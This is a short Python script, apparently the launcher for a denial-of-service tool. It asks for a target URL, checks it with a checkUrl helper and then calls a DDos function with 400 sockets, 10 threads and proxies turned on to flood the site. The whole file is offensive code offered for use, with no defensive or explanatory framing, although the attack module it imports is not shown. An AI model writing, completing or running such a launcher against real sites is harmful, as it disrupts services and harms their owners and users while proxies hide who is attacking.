from DDos import checkUrl, DDos

while True:
    url = input("Enter URL => ")
    if checkUrl(url): break
    else: print("404 NOT FOUND :) ")

DDos(url, sockets=400, threads=10, use_proxies= True)

